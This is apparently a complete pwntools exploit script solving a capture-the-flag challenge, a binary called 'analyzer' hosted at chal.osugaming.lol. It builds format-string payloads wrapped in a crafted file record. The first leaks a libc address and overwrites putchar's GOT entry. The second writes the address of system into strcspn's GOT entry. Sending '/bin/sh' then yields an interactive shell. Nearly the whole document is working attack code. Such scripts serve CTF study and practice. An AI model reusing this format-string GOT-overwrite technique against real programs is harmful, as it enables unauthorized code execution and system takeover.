#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("analyzer_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")
context.binary = exe

host = "chal.osugaming.lol"
port = 7273

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# main+632 string format
gdbscript = '''
start
bp main+632
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

# functions

def osr_file(name: bytes):
    ret = b"\x00" + b"a"*4 + b"\x0b"                                        # mode
    ret += b"\x20" + b"56e218fb6a5666d2a85005027228d0dd" + b"\x0b"          # hash
    ret += len(name).to_bytes() + name + b"\x0b"                            # name

    return ret.hex()

# --- end functions ---

# leak libc
payload = b"%3$pleaked_libc%39x%21$hn%5769x%20$hn"
payload = payload + b"a"*(0x30-len(payload))
payload += p64(exe.got['putchar'])
payload += p64(exe.got['putchar']+2)

sl(osr_file(payload))

leaked_libc = io.recvuntil(b"leaked_libc")[-23:-11]
leaked_libc = int(leaked_libc, 16)
libc.address = leaked_libc - (libc.sym['write']+23)
success(f"libc.address: {hex(libc.address)}")
info(f"system.address: {hex(libc.sym['system'])}")

system = libc.sym['system']

# overwrite system to got strcspn

## key = target, value = data. [target] = data
format_string_dict = {}
format_string_dict[exe.got['strcspn']] = system & 0xffff
system = system >> 16
format_string_dict[exe.got['strcspn'] + 2] = system & 0xffff
system = system >> 16
format_string_dict[exe.got['strcspn'] + 4] = system & 0xffff
## sort dict by value
sortedDict = {k: v for k, v in sorted(format_string_dict.items(), key=lambda item: item[1])}

first = list(sortedDict.values())[0]
second = list(sortedDict.values())[1] - list(sortedDict.values())[0]
third = list(sortedDict.values())[2] - list(sortedDict.values())[1]

payload = b"%%%dx%%20$hn%%%dx%%21$hn%%%dx%%22$hn" % (first, second, third)
payload = payload + b"a"*(0x30-len(payload))
for i in range(3):
    payload += p64(list(sortedDict)[i])

sl(osr_file(payload))
sl(b"/bin/sh\x00")

io.interactive()

